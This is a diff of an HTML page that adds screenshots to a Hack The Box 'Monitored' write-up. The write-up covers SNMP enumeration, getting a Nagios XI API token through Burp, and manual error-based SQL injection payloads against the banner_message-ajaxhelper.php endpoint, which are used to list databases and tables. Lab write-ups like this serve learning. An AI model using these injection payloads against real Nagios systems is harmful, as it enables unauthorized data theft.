@@ -132,7 +132,9 @@ I turn to snmpwalk to retrieve management values. Snmpwalk does this by using SN
 `snmpwalk -v2c -c public 10.129.230.96` to print a list of OIDs from the target device, where `-v2c` is for the SNMP version to use, `-c public` to specify the community string, followed by the target's IP address.
 
 Snmpwalk returns a ton of output, some of which isn't very readable, as you can see:</p>
+          <img src="images/htbmonitored1.PNG" alt="htbmonitored1.PNG">
           <p>To make sense of this, I edit my host's snmp.conf in /etc/snmp/snmp.conf, making sure to uncomment `mibdirs' as shown:</p>
+          <img src="images/htbmonitored2.PNG" alt="htbmonitored2.PNG">
           <p>I love Vim!
 
 `esc` then `:wq` to save and exit.
@@ -145,7 +147,9 @@ Now, I'm going to download snmp-mibs-downloader. It's designed for managing MIB 
 I get "Package 'snmp-mibs-downloader' has no installation candidate", so I update my package list with `sudo apt update` and run the command again. The package is downloaded, and I now have the MIBS database. Back to the previous snmpwalk command, but this time I add `-m all`, so we'll get a much more useful input. Instead of just printing out random OIDs, we have now have information about them.
 
 From snmpwalk's output, we get tons of information about packges on the target and processes running on the target. This information would probably be useful when trying to find alternative ways to exploit the machine. Better yet, a password can be found:</p>
+           <img src="images/htbmonitored3.PNG" alt="htbmonitored3.PNG">
            <p>Sadly, the login doesn't work, but not in the way you think:</p>
+           <img src="images/htbmonitored4.PNG" alt="htbmonitored4.PNG">
            <p>Entering any other combination results in "Invalid username or password", but here the panel tells me that the account has been disabled or doesn't exist. We know it existed at some point thanks to SNMP. I can probably interact with Nagios using some sort of API to get around this, so I start Burp Suite (cURL can also be used for this part, but Burp Suite is a little more intuitive).
 
 HTB says that the API documentation for Nagios XI is weak, so I'll have to search forum posts or fuzz the API. But before that, I'm going to download FoxyProxy, which is an open-source proxy management tool. FoxyProxy switches your internet connection across one or more proxy servers using several possible methods chosen by the user. It's useful for debugging URL patterns, limiting IP address discovery by turning off WebRTC, etc. I'm going to use FoxyProxy with Burp to forward traffic to Burp, so that I can manipulate the web request before sending it to the web server.
@@ -156,6 +160,7 @@ In Burp, we can see the POST request. We have the ???
 
 What I'm focused on is getting the token for authentication to the Nagios API. I send the request to the Repeater module of Burp, which you can see here:
 </p>
+           <img src="images/htbmonitored5.PNG" alt="htbmonitored5.PNG">
            <p>I remove some uneeded information from the request:</p>
            <p>I then modify the request so that it's sent to `/nagiosxi/api/v1/authenticate` instead of /nagiosxi/login.php`. After forwarding this request to the server, a response is delivered within Burp. A nice token with which I can authenticate. :)
 
@@ -168,6 +173,7 @@ So it reaches from 5.11.0 up to and including 5.11.1 according to NIST, and it a
 First, I'm going to exploit this flaw manually.
 
 I hop back into Burp and modify the request as follows:</p>
+           <img src="images/htbmonitored6.PNG" alt="htbmonitored6.PNG">
            <p>`POST /nagiosxi/api/v1/authenticate` becomes `POST /nagiosxi/admin/banner_message-ajaxhelper.php`.
 
 `username=svc&password=XjH7VCehowpR1xZB` becomes `action=acknowledge_banner_message&id=EXPLOIT` ("EXPLOIT" is just filler text here). I send it and the server returns this:
@@ -175,6 +181,7 @@ I hop back into Burp and modify the request as follows:</p>
 So, I know for sure that an SQL injection problem exists here, but how do I actually extract important data from the server?
 
 Sending `action=acknowledge_banner_message&id=1 AND EXTRACTVALUE(1,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA))` to the server results in the message:</p>
+           <img src="images/htbmonitored7.PNG" alt="htbmonitored7.PNG">
            <p>Next is database enumeration. Sending `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))` gives me two databases in the response: "information_schema" and "nagiosxi". To access the columns, I use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(TABLE_NAME,":",COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi')))`, which gives me a limited amount of information. Not enough that it's useful.
 
 I then use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'nagiosxi' LIMIT 0,1)))`, with this, I can go through a list of tables by modifying `LIMIT 0,1` to different numbers. For example: `LIMIT 0,1` returns `xi_deploy_agents` in the server response. `LIMIT 3,1` returns `xi_mibs` in the server response. `LIMIT 7,1` returns `xi_usermeta` in the server response. You get the idea.
